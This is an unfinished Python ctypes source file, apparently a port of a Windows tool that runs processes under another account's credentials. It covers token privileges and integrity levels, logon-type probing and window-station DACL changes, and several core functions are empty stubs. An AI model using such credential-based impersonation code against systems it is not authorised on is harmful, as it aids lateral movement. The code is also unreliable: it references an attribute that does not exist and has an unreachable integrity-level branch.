import os
import enum
import ctypes
import ctypes.wintypes
import argparse
import logging

ERROR_LOGON_TYPE_NOT_GRANTED = 1385
LOGON32_LOGON_SERVICE = ctypes.wintypes.DWORD(5)
LOGON32_LOGON_BATCH = ctypes.wintypes.DWORD(4)
LOGON32_LOGON_NETWORK_CLEARTEXT = ctypes.wintypes.DWORD(8)
LOGON32_LOGON_NETWORK  = ctypes.wintypes.DWORD(3)
LOGON32_LOGON_INTERACTIVE = ctypes.wintypes.DWORD(2)
LOGON_WITH_PROFILE = ctypes.c_uint32(1)
DUPLICATE_SAME_ACCESS = ctypes.c_uint(0x2)
LOGON32_PROVIDER_DEFAULT = ctypes.wintypes.DWORD(0)
LOGON32_PROVIDER_WINNT50 = ctypes.wintypes.DWORD(3)
LOGON32_LOGON_NEW_CREDENTIALS = ctypes.wintypes.DWORD(9)
Startf_UseStdHandles = 0x00000100
BUFFER_SIZE_PIPE = 1048576
UOI_NAME = 2
READ_CONTROL = 0x00020000
WRITE_DAC = 0x00040000
DESKTOP_WRITEOBJECTS = 0x00000080
DESKTOP_READOBJECTS = 0x00000001
ERROR_INSUFFICIENT_BUFFER = 122
ERROR_INVALID_FLAGS = 1004
ERROR_NO_TOKEN = 1008
SECURITY_DESCRIPTOR_REVISION = 1
ACL_REVISION = 2
MAXDWORD = 0xffffffff
ACCESS_ALLOWED_ACE_TYPE = 0x0
CONTAINER_INHERIT_ACE = 0x2
INHERIT_ONLY_ACE = 0x8
OBJECT_INHERIT_ACE = 0x1
NO_PROPAGATE_INHERIT_ACE = 0x4
LOGON_NETCREDENTIALS_ONLY = 2
CREATE_NO_WINDOW = 0x08000000


kernel32 = ctypes.WinDLL("kernel32.dll")
user32 = ctypes.WinDLL("User32.dll")
ws2_32 = ctypes.WinDLL("ws2_32.dll")
advapi32 = ctypes.WinDLL("Advapi32.dll")
userenv = ctypes.WinDLL("Userenv.dll")

closesocket = ws2_32.closesocket
ReadFile = kernel32.ReadFile
CloseHandle = kernel32.CloseHandle
CreatePipe = kernel32.CreatePipe
DuplicateHandle = kernel32.DuplicateHandle
SetNamedPipeHandleState = kernel32.SetNamedPipeHandleState
WaitForSingleObject = kernel32.WaitForSingleObject
GetCurrentProcessId = kernel32.GetCurrentProcessId
ProcessIdToSessionId = kernel32.ProcessIdToSessionId
GetTokenInformation = advapi32.GetTokenInformation
GetCurrentThread = kernel32.GetCurrentThread
LogonUser = advapi32.LogonUserA
LogonUserW = advapi32.LogonUserW
GetSecurityDescriptorDacl = advapi32.GetSecurityDescriptorDacl
LookupAccountName = advapi32.LookupAccountNameA
GetAclInformation = advapi32.GetAclInformation
InitializeSecurityDescriptor = advapi32.InitializeSecurityDescriptor
GetLengthSid = advapi32.GetLengthSid
InitializeAcl = advapi32.InitializeAcl
GetAce = advapi32.GetAce
AddAce = advapi32.AddAce
CopySid = advapi32.CopySid
LookupPrivilegeName = advapi32.LookupPrivilegeNameA
SetSecurityInfo = advapi32.SetSecurityInfo
CreateProcessWithLogonW = advapi32.CreateProcessWithLogonW
ImpersonateLoggedOnUser = advapi32.ImpersonateLoggedOnUser
AllocateAndInitializeSid = advapi32.AllocateAndInitializeSid
OpenProcessToken = advapi32.OpenProcessToken
GetSidSubAuthorityCount = advapi32.GetSidSubAuthorityCount
GetSidSubAuthority = advapi32.GetSidSubAuthority
OpenThreadToken = advapi32.OpenThreadToken
DuplicateTokenEx = advapi32.DuplicateTokenEx
AddAccessAllowedAce = advapi32.AddAccessAllowedAce
SetSecurityDescriptorDacl = advapi32.SetSecurityDescriptorDacl
SetTokenInformation = advapi32.SetTokenInformation
GetProcessWindowStation = user32.GetProcessWindowStation
GetUserObjectInformation = user32.GetUserObjectInformationA
OpenWindowStation = user32.OpenWindowStationA
SetProcessWindowStation = user32.SetProcessWindowStation
OpenDesktop = user32.OpenDesktopA
GetUserObjectSecurity = user32.GetUserObjectSecurity
SetUserObjectSecurity = user32.SetUserObjectSecurity
GetUserProfileDirectory = userenv.GetUserProfileDirectoryA

PSID = ctypes.c_void_p

class c_enum(enum.IntEnum):
    @classmethod
    def from_param(cls, obj):
        return ctypes.c_int(cls(obj))


class LUID(ctypes.Structure):
    _fields_ = [
        ('LowPart', ctypes.c_uint32),
        ('HighPart', ctypes.c_int32)
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('Luid', LUID),
        ('Attributes', ctypes.wintypes.DWORD)
    ]

class SID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('Sid', PSID),
        ('Attributes', ctypes.wintypes.DWORD)
    ]

class _TOKEN_MANDATORY_LABEL(ctypes.Structure):
    _fields_ = [
        ('Label', SID_AND_ATTRIBUTES),
    ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ('PrivilegeCount', ctypes.wintypes.DWORD),
        ('Privileges', (LUID_AND_ATTRIBUTES * 64))
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb',               ctypes.wintypes.DWORD),
        ('lpReserved',       ctypes.wintypes.LPSTR),
        ('lpDesktop',        ctypes.wintypes.LPSTR),
        ('lpTitle',          ctypes.wintypes.LPSTR),
        ('dwX',              ctypes.wintypes.DWORD),
        ('dwY',              ctypes.wintypes.DWORD),
        ('dwXSize',          ctypes.wintypes.DWORD),
        ('dwYSize',          ctypes.wintypes.DWORD),
        ('dwXCountChars',    ctypes.wintypes.DWORD),
        ('dwYCountChars',    ctypes.wintypes.DWORD),
        ('dwFillAttribute',  ctypes.wintypes.DWORD),
        ('dwFlags',          ctypes.wintypes.DWORD),
        ('wShowWindow',      ctypes.wintypes.WORD),
        ('cbReserved2',      ctypes.wintypes.WORD),
        ('lpReserved2',      ctypes.wintypes.LPBYTE),
        ('hStdInput',        ctypes.wintypes.HANDLE),
        ('hStdOutput',       ctypes.wintypes.HANDLE),
        ('hStdError',        ctypes.wintypes.HANDLE)
    ] 

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("process",    ctypes.wintypes.HANDLE),
        ("thread",     ctypes.wintypes.HANDLE),
        ("processId",  ctypes.wintypes.DWORD),
        ("threadId",   ctypes.wintypes.DWORD)
    ]

class ACL_SIZE_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('AceCount', ctypes.wintypes.DWORD),
        ('AclBytesInUse', ctypes.wintypes.DWORD),
        ('AcleBytesFree', ctypes.wintypes.DWORD)
    ]

class SID_IDENTIFIER_AUTHORITY(ctypes.Structure):
    _fields_ = [
        ('Value', (ctypes.c_byte * 6)),
    ]

class SECURITY_IMPERSONATION_LEVEL(object):
    SecurityAnonymous = ctypes.c_int(0)
    SecurityIdentification = ctypes.c_int(1)
    SecurityImpersonation = ctypes.c_int(2)
    SecurityDelegation = ctypes.c_int(3)

class SE_OBJECT_TYPE(object):
    SE_UNKNOWN_OBJECT_TYPE = ctypes.c_int(0)
    SE_FILE_OBJECT = ctypes.c_int(1)
    SE_SERVICE = ctypes.c_int(2)
    SE_PRINTER = ctypes.c_int(3)
    SE_REGISTRY_KEY = ctypes.c_int(4)
    SE_LMSHARE = ctypes.c_int(5)
    SE_KERNEL_OBJECT = ctypes.c_int(6)
    SE_WINDOW_OBJECT = ctypes.c_int(7)
    SE_DS_OBJECT = ctypes.c_int(8)
    SE_DS_OBJECT_ALL = ctypes.c_int(9)
    SE_PROVIDER_DEFINED_OBJECT = ctypes.c_int(10)
    SE_WMIGUID_OBJECT = ctypes.c_int(11)
    SE_REGISTRY_WOW64_32KEY = ctypes.c_int(12)

class SECURITY_INFORMATION(object):
    def __init__(self):
        self.OWNER_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x00000001)
        self.GROUP_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x00000002)
        self.DACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x00000004)
        self.SACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x00000008)
        self.UNPROTECTED_SACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x10000000)
        self.UNPROTECTED_DACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x20000000)
        self.PROTECTED_SACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x40000000)
        self.PROTECTED_DACL_SECURITY_INFORMATION = ctypes.wintypes.DWORD(0x80000000)

class SID_NAME_USE(object):
    def __init__(self):
        self.SidTypeUser = ctypes.c_int(1)
        self.SidTypeGroup = ctypes.c_int(2)
        self.SidTypeDomain = ctypes.c_int(3)
        self.SidTypeAlias = ctypes.c_int(4)
        self.SidTypeWellKnownGroup = ctypes.c_int(5)
        self.SidTypeDeletedAccount = ctypes.c_int(6)
        self.SidTypeInvalid = ctypes.c_int(7)
        self.SidTypeUnknown = ctypes.c_int(8)
        self.SidTypeComputer = ctypes.c_int(9)
        self.SidTypeLabel = ctypes.c_int(10)


class TOKEN_ELEVATION(ctypes.Structure):
    _fields_ = [
        ('TokenIsElevated', ctypes.c_uint32)
    ]

class TOKEN_ELEVATION_TYPE(ctypes.Structure):
    _fields_ = [
        ('TokenElevationType', ctypes.c_uint32)
    ]

class ACL_INFORMATION_CLASS(object):
    def __init__(self):
        self.AclRevisionInformation = ctypes.wintypes.DWORD(1)
        self.AclSizeInformation = ctypes.wintypes.DWORD(2)

class TokenGroupAttributes(object):
    Disabled = ctypes.wintypes.DWORD(0)
    SE_GROUP_MANDATORY = ctypes.wintypes.DWORD(1)
    SE_GROUP_ENABLED_BY_DEFAULT = ctypes.wintypes.DWORD(0x2)
    SE_GROUP_ENABLED = ctypes.wintypes.DWORD(0x4)
    SE_GROUP_OWNER = ctypes.wintypes.DWORD(0x8)
    SE_GROUP_USE_FOR_DENY_ONLY = ctypes.wintypes.DWORD(0x10)
    SE_GROUP_INTEGRITY = ctypes.wintypes.DWORD(0x20)
    SE_GROUP_INTEGRITY_ENABLED = ctypes.wintypes.DWORD(0x40)
    SE_GROUP_RESOURCE = ctypes.wintypes.DWORD(0x20000000)
    SE_GROUP_LOGON_ID = ctypes.wintypes.DWORD(0xC0000000)

class TOKEN_INFORMATION_CLASS(object):
    TokenUser = ctypes.c_int(1)
    TokenGroups = ctypes.c_int(2)
    TokenPrivileges = ctypes.c_int(3)
    TokenOwner = ctypes.c_int(4)
    TokenPrimaryGroup = ctypes.c_int(5)
    TokenDefaultDacl = ctypes.c_int(6)
    TokenSource = ctypes.c_int(7)
    TokenType = ctypes.c_int(8)
    TokenImpersonationLevel = ctypes.c_int(9)
    TokenStatistics = ctypes.c_int(10)
    TokenRestrictedSids = ctypes.c_int(11)
    TokenSessionId = ctypes.c_int(12)
    TokenGroupsAndPrivileges = ctypes.c_int(13)
    TokenSessionReference = ctypes.c_int(14)
    TokenSandBoxInert = ctypes.c_int(15)
    TokenAuditPolicy = ctypes.c_int(16)
    TokenOrigin = ctypes.c_int(17)
    TokenElevationType = ctypes.c_int(18)
    TokenLinkedToken = ctypes.c_int(19)
    TokenElevation = ctypes.c_int(20)
    TokenHasRestrictions = ctypes.c_int(21)
    TokenAccessInformation = ctypes.c_int(22)
    TokenVirtualizationAllowed = ctypes.c_int(23)
    TokenVirtualizationEnabled = ctypes.c_int(24)
    TokenIntegrityLevel = ctypes.c_int(25)
    TokenUIAccess = ctypes.c_int(26)
    TokenMandatoryPolicy = ctypes.c_int(27)
    TokenLogonSid = ctypes.c_int(28)
    TokenIsAppContainer = ctypes.c_int(29)
    TokenCapabilities = ctypes.c_int(30)
    TokenAppContainerSid = ctypes.c_int(31)
    TokenAppContainerNumber = ctypes.c_int(32)
    TokenUserClaimAttributes = ctypes.c_int(33)
    TokenDeviceClaimAttributes = ctypes.c_int(34)
    TokenRestrictedUserClaimAttributes = ctypes.c_int(35)
    TokenRestrictedDeviceClaimAttributes = ctypes.c_int(36)
    TokenDeviceGroups = ctypes.c_int(37)
    TokenRestrictedDeviceGroups = ctypes.c_int(38)
    TokenSecurityAttributes = ctypes.c_int(39)
    TokenIsRestricted = ctypes.c_int(40)
    TokenProcessTrustLevel = ctypes.c_int(41)
    TokenPrivateNameSpace = ctypes.c_int(42)
    TokenSingletonAttributes = ctypes.c_int(43)
    TokenBnoIsolation = ctypes.c_int(44)
    TokenChildProcessFlags = ctypes.c_int(45)
    TokenIsLessPrivilegedAppContainer = ctypes.c_int(46)
    TokenIsSandboxed = ctypes.c_int(47)
    TokenIsAppSilo = ctypes.c_int(48)
    TokenLoggingInformation = ctypes.c_int(49)
    MaxTokenInfoClass = ctypes.c_int(50)


class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('nLength', ctypes.wintypes.DWORD),
        ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
        ('bInheritHandle', ctypes.c_bool)
    ]


class ACCESS_MASK(object):
    def __init__(self):
        self.DELETE = 0x00010000
        self.READ_CONTROL = 0x00020000
        self.WRITE_DAC = 0x00040000
        self.WRITE_OWNER = 0x00080000
        self.SYNCHRONIZE = 0x00100000
        self.STANDARD_RIGHTS_REQUIRED = 0x000F0000
        self.STANDARD_RIGHTS_READ = READ_CONTROL
        self.STANDARD_RIGHTS_WRITE = READ_CONTROL
        self.STANDARD_RIGHTS_EXECUTE = READ_CONTROL
        self.STANDARD_RIGHTS_ALL = 0x001F0000
        self.SPECIFIC_RIGHTS_ALL = 0x0000FFFF
        self.GENERIC_READ = 0x80000000
        self.GENERIC_WRITE = 0x40000000
        self.GENERIC_EXECUTE = 0x20000000
        self.GENERIC_ALL = 0x10000000
        self.GENERIC_ACCESS = (self.GENERIC_READ | self.GENERIC_WRITE | self.GENERIC_EXECUTE | self.GENERIC_ALL)
        self.WINSTA_ENUMDESKTOPS = 0x00000001
        self.WINSTA_READATTRIBUTES = 0x00000002
        self.WINSTA_ACCESSCLIPBOARD = 0x00000004
        self.WINSTA_CREATEDESKTOP = 0x00000008
        self.WINSTA_WRITEATTRIBUTES = 0x00000010
        self.WINSTA_ACCESSGLOBALATOMS = 0x00000020
        self.WINSTA_EXITWINDOWS = 0x00000040
        self.WINSTA_ENUMERATE = 0x00000100
        self.WINSTA_READSCREEN = 0x00000200
        self.WINSTA_ALL =  (
            self.WINSTA_ACCESSCLIPBOARD  | self.WINSTA_ACCESSGLOBALATOMS | self.WINSTA_CREATEDESKTOP    | self.WINSTA_ENUMDESKTOPS      | 
            self.WINSTA_ENUMERATE        | self.WINSTA_EXITWINDOWS       | self.WINSTA_READATTRIBUTES   | self.WINSTA_READSCREEN        | 
            self.WINSTA_WRITEATTRIBUTES  | self.DELETE                   | READ_CONTROL                 | WRITE_DAC                     | 
            self.WRITE_OWNER
        )
        self.DESKTOP_READOBJECTS = 0x00000001
        self.DESKTOP_CREATEWINDOW = 0x00000002
        self.DESKTOP_CREATEMENU = 0x00000004
        self.DESKTOP_HOOKCONTROL = 0x00000008
        self.DESKTOP_JOURNALRECORD = 0x00000010
        self.DESKTOP_JOURNALPLAYBACK = 0x00000020
        self.DESKTOP_ENUMERATE = 0x00000040
        self.DESKTOP_WRITEOBJECTS = 0x00000080
        self.DESKTOP_SWITCHDESKTOP = 0x00000100
        self.DESKTOP_ALL = (
            self.DESKTOP_READOBJECTS   | self.DESKTOP_CREATEWINDOW    | self.DESKTOP_CREATEMENU | self.DESKTOP_HOOKCONTROL | 
            self.DESKTOP_JOURNALRECORD | self.DESKTOP_JOURNALPLAYBACK | self.DESKTOP_ENUMERATE  | self.DESKTOP_WRITEOBJECTS |
            self.DESKTOP_SWITCHDESKTOP | self.STANDARD_RIGHTS_REQUIRED
        )
        


class ACE_HEADER(ctypes.Structure):
    _fields_ = [
        ('AceType', ctypes.c_byte),
        ('AceFlags', ctypes.c_byte),
        ('AceSize', ctypes.c_ushort),
    ]


class ACCESS_ALLOWED_ACE(ctypes.Structure):
    _fields_ = [
        ('Header', ACE_HEADER),
        ('Mask', ctypes.wintypes.DWORD),
        ('SidStart', ctypes.wintypes.DWORD)
    ]

class IntegrityLevel(object):
    Same = -2
    Unknown = -1
    Untrusted = 0
    Low = 0x1000
    Medium = 0x2000
    High = 0x3000
    System = 0x4000
    ProtectedProcess = 0x5000

def convertAttributeToString(attribute):
    if attribute == 0:
        return "Disabled"
    if attribute == 1:
        return "Enabled Default"
    if attribute == 2:
        return "Enabled"
    if attribute == 3:
        return "Enabled|Enable Default"
    return "Error"

class AccessToken(object):
    SECURITY_MANDATORY_UNTRUSTED_RID = 0
    SECURITY_MANDATORY_LOW_RID = 0x1000
    SECURITY_MANDATORY_MEDIUM_RID = 0x2000
    SECURITY_MANDATORY_HIGH_RID = 0x3000
    SECURITY_MANDATORY_SYSTEM_RID = 0x4000
    SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000
    SE_PRIVILEGE_ENABLED = 0x00000002
    MANDATORY_LABEL_AUTHORITY = bytes([0,0,0,0,0,16])
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    TOKEN_ASSIGN_PRIMARY = 0x0001
    TOKEN_DUPLICATE = 0x0002
    TOKEN_IMPERSONATE = 0x0004
    TOKEN_QUERY = 0x0008
    TOKEN_QUERY_SOURCE = 0x0010
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_ADJUST_GROUPS = 0x0040
    TOKEN_ADJUST_DEFAULT = 0x0080
    TOKEN_ADJUST_SESSIONID = 0x0100
    TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS = ( STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE
        | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES |
        TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID )
    MANDATORY_LABEL_AUTHORITY = (ctypes.c_byte * 6)(0,0,0,0,0,16)

    def IsFilteredUACToken(hToken):
        tokenIsFiltered = False
        TokenInfLength = ctypes.wintypes.DWORD(0)
        if AccessToken.GetTokenIntegrityLevel(hToken) >= IntegrityLevel.High:
            return False
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
        tokenElevationPtr = (ctypes.c_byte * TokenInfLength.value)()
        if not GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, ctypes.byref(tokenElevationPtr), TokenInfLength, ctypes.byref(TokenInfLength)):
            raise ValueError(f"GetTokenInformation TokenElevation true")
        tokenElevation = ctypes.cast(ctypes.pointer(tokenElevationPtr), ctypes.POINTER(TOKEN_ELEVATION))
        if tokenElevation.contents.TokenIsElevated > 0:
            tokenIsFiltered = False
        else:
            TokenInfLength = ctypes.wintypes.DWORD(0)
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
            tokenElevationTypePtr = (ctypes.c_byte * TokenInfLength.value)()
            if not GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, ctypes.byref(tokenElevationTypePtr), TokenInfLength, ctypes.byref(TokenInfLength)):
                raise ValueError("GetTokenInformation TokenElevationType true")
            tokenElevationType = ctypes.cast(ctypes.pointer(tokenElevationTypePtr), ctypes.POINTER(TOKEN_ELEVATION_TYPE))
            if tokenElevationType.contents.TokenElevationType == 3:
                tokenIsFiltered = True
        return tokenIsFiltered

    def GetTokenPrivileges(tHandle):
        privileges = []
        TokenInfLength = ctypes.wintypes.DWORD(0)
        result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
        TokenInformation = (ctypes.c_ubyte * TokenInfLength.value)()
        result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, ctypes.byref(TokenInformation), TokenInfLength, ctypes.byref(TokenInfLength))
        if not result:
            raise ValueError(f"GetTokenInformation true")
        TokenPrivileges = ctypes.cast(ctypes.pointer(TokenInformation), ctypes.POINTER(TOKEN_PRIVILEGES))
        for tokenPriv in range(0, TokenPrivileges.contents.PrivilegeCount):
            luid = TokenPrivileges.contents.Privileges[tokenPriv].Luid
            luidNameLen = ctypes.wintypes.DWORD(0)
            LookupPrivilegeName(ctypes.c_void_p(0), ctypes.byref(luid), ctypes.c_void_p(0), ctypes.byref(luidNameLen))
            sb = (ctypes.c_char * luidNameLen.value)()
            result = LookupPrivilegeName(ctypes.c_void_p(0), ctypes.byref(luid), sb, ctypes.byref(luidNameLen))
            if not result:
                raise ValueError("LookupPrivilegeName true")
            privilegeStatus = [
                bytes(sb).decode()[:-1],
                convertAttributeToString(TokenPrivileges.contents.Privileges[tokenPriv].Attributes)
            ]
            privileges.append(privilegeStatus)
        return privileges
        

    def GetTokenIntegrityLevel(hToken):
        illevel = IntegrityLevel.Unknown
        pb = (ctypes.c_ubyte * 1000)()
        cb = ctypes.c_uint(1000)
        if GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ctypes.byref(pb), cb, ctypes.byref(cb)):
            pSid = ctypes.c_void_p.from_address(ctypes.addressof(pb))
            dwIntegrityLevel = GetSidSubAuthority(pSid, ctypes.wintypes.DWORD(GetSidSubAuthorityCount(pSid) - 1))
            if dwIntegrityLevel == AccessToken.SECURITY_MANDATORY_LOW_RID:
                return IntegrityLevel.Low
            elif dwIntegrityLevel >= AccessToken.SECURITY_MANDATORY_MEDIUM_RID and dwIntegrityLevel < AccessToken.SECURITY_MANDATORY_HIGH_RID:
                return IntegrityLevel.Medium
            elif dwIntegrityLevel >= AccessToken.SECURITY_MANDATORY_HIGH_RID:
                return IntegrityLevel.High
            elif dwIntegrityLevel >= AccessToken.SECURITY_MANDATORY_SYSTEM_RID:
                return IntegrityLevel.System
            return IntegrityLevel.Unknown
        return illevel

    def SetTokenIntegrityLevel(hToken, integrity):
        ret = False
        pSID = ctypes.c_void_p(0)
        tokenLabel = _TOKEN_MANDATORY_LABEL()
        authoritySidStruct = SID_IDENTIFIER_AUTHORITY()
        authoritySidStruct.Value = AccessToken.MANDATORY_LABEL_AUTHORITY
        pLabelAuthority = (ctypes.c_ubyte * ctypes.sizeof(authoritySidStruct))()
        ctypes.memmove(pLabelAuthority, ctypes.byref(authoritySidStruct), ctypes.sizeof(pLabelAuthority))
        result = AllocateAndInitializeSid(
            ctypes.byref(pLabelAuthority), 
            ctypes.c_byte(1), 
            ctypes.wintypes.DWORD(integrity), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.byref(pSID)
        )
        tokenLabel.Label.Sid = pSID
        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY
        labelSize = ctypes.sizeof(tokenLabel)
        pLabel = (ctypes.c_ubyte * labelSize)()
        ctypes.memmove(pLabel, ctypes.byref(tokenLabel), ctypes.sizeof(pLabel))
        result = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ctypes.byref(pLabel), ctypes.wintypes.DWORD(labelSize))
        if not result:
            raise ValueError(f"[!] Failed to set the token's Integrity Level: {integrity}")
        else:
            ret = True
        return ret

def CreateAnonymousPipeEveryoneAccess(hReadPipe, hWritePipe):
    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(sa)
    sa.lpSecurityDescriptor = ctypes.c_void_p(0)
    sa.bInheritHandle = True
    if CreatePipe(ctypes.byref(hReadPipe), ctypes.byref(hWritePipe), ctypes.byref(sa), ctypes.wintypes.DWORD(BUFFER_SIZE_PIPE)):
        return True
    return False

def ConnectRemote(remote):
    pass

def ParseCommonProcessInCommandline(commandline):
    cmd_args = commandline.split(" ")
    if (cmd_args[0].lower() == "cmd" or cmd_args[0].lower() == "cmd.exe"):
        cmd_args[0] = os.environ['COMSPEC']
    elif (cmd_args[0].lower() == "powershell" or cmd_args[0].lower() == "powershell.exe"):
        cmd_args[0] = f"{os.environ['WINDIR']}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    return " ".join(cmd_args)

def CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider):
    hTokenCheck1 = ctypes.c_void_p(0)
    if not LogonUser(ctypes.byref(username), ctypes.byref(domainName), ctypes.byref(password), ctypes.wintypes.DWORD(logonType), logonProvider, ctypes.byref(hTokenCheck1)):
        if ctypes.GetLastError() == ERROR_LOGON_TYPE_NOT_GRANTED:
            availableLogonType = 0
            for logonTypeTry in [LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE]:
                hTokenCheck2 = ctypes.c_void_p(0)
                if LogonUser(username, domainName, password, logonTypeTry, logonProvider, ctypes.byref(hTokenCheck2)):
                    availableLogonType = logonTypeTry
                    if AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium:
                        availableLogonType = logonTypeTry
                        CloseHandle(hTokenCheck2)
                        break
                if hTokenCheck2.value != 0:
                    CloseHandle(hTokenCheck2)
            if availableLogonType != 0:
                raise ValueError(f"Selected logon type '{ logonType }' is not granted to the user '{ username }'. Use available logon type '{ availableLogonType }'.")
            else:
                raise ValueError(f"LogonUser true")
        raise ValueError(f"LogonUser true")
    if hTokenCheck1.value != 0:
        CloseHandle(hTokenCheck1)

def RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, startupInfo, processInfo, logonTypeNotFiltered):
    pass

def GetProcessFunction(createProcessFunction):
    if createProcessFunction == 0:
        return "CreateProcessAsUserW()"
    elif createProcessFunction == 1:
        return "CreateProcessWithTokenW()"
    else:
        return "CreateProcessWithLogonW()"

def RunasCreateProcessAsUserW():
    pass

def RunasCreateProcessWithTokenW():
    pass

def GetUserSid(domain, username):
    err = 0
    Sid = ctypes.c_byte()
    cbSid = ctypes.wintypes.DWORD(0)
    referencedDomainName = ctypes.c_void_p(None)
    cchReferencedDomainName = ctypes.wintypes.DWORD(0)
    sidUse = SID_NAME_USE()
    if domain and domain != ".":
        fqan = f"{domain}\\{username}"
    else:
        fqan = username
    fqan_buffer = ctypes.create_string_buffer(bytes(fqan.encode()), len(fqan) + 1)
    if not LookupAccountName(ctypes.c_void_p(None), ctypes.byref(fqan_buffer), ctypes.byref(Sid), ctypes.byref(cbSid), referencedDomainName, ctypes.byref(cchReferencedDomainName), ctypes.byref(sidUse.SidTypeUser)):
        if ctypes.GetLastError() in [ERROR_INVALID_FLAGS, ERROR_INSUFFICIENT_BUFFER]:
            Sid = (ctypes.c_byte * cbSid.value)()
            referencedDomainName = (ctypes.c_byte * cchReferencedDomainName.value)()
            if not LookupAccountName(ctypes.c_void_p(None), ctypes.byref(fqan_buffer), ctypes.byref(Sid), ctypes.byref(cbSid), ctypes.byref(referencedDomainName), ctypes.byref(cchReferencedDomainName), ctypes.byref(sidUse.SidTypeUser)):
                err = ctypes.GetLastError()
    else:
        raise ValueError(f"The username { fqan } has not been found. LookupAccountName true")
    if err != 0:
        raise ValueError(f"The username { fqan } has not been found. LookupAccountName true")
    return Sid

def DefaultCreateProcessFunction():
    currentTokenHandle = ctypes.wintypes.HANDLE(0)
    SeAssignPrimaryTokenPrivilegeAssigned = False
    SeImpersonatePrivilegeAssigned = False
    if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.TOKEN_QUERY), ctypes.byref(currentTokenHandle)):
        raise ValueError("Failed to obtain token")
    privs = AccessToken.GetTokenPrivileges(currentTokenHandle)
    for priv in privs:
        if priv[0] == "SeAssignPrimaryTokenPrivilege" and AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= IntegrityLevel.Medium:
            SeAssignPrimaryTokenPrivilegeAssigned = True
        elif priv[0] == "SeImpersonatePrivilege" and AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= IntegrityLevel.High:
            SeImpersonatePrivilegeAssigned = True
    if SeAssignPrimaryTokenPrivilegeAssigned:
        createProcessFunction = 0
    elif SeImpersonatePrivilegeAssigned:
        createProcessFunction = 1
    else:
        createProcessFunction = 2
    return createProcessFunction

class WindowStationDACL(object):
    def __init__(self):
        self.hWinsta = ctypes.c_void_p(0)
        self.hDesktop = ctypes.c_void_p(0)
        self.userSid = ctypes.c_void_p(0)

    def AddAllowedAceToDACL(self, pDacl, mask, aceFlags, aceSize):
        offset = ctypes.sizeof(ACCESS_ALLOWED_ACE) - ctypes.sizeof(ctypes.c_uint)
        AceHeader = ACE_HEADER()
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE
        AceHeader.AceFlags = aceFlags
        AceHeader.AceSize = aceSize
        pNewAcePtr = (ctypes.c_ubyte * aceSize)()
        pNewAceStruct = ACCESS_ALLOWED_ACE()
        pNewAceStruct.Header = AceHeader
        pNewAceStruct.Mask = mask
        sidStartPtr = ctypes.addressof(pNewAcePtr) + offset
        ctypes.memmove(pNewAcePtr, ctypes.byref(pNewAceStruct), ctypes.sizeof(pNewAceStruct))
        if not CopySid(ctypes.wintypes.DWORD(GetLengthSid(self.userSid)), ctypes.c_void_p(sidStartPtr), ctypes.byref(self.userSid)):
            raise ValueError("CopySid true")
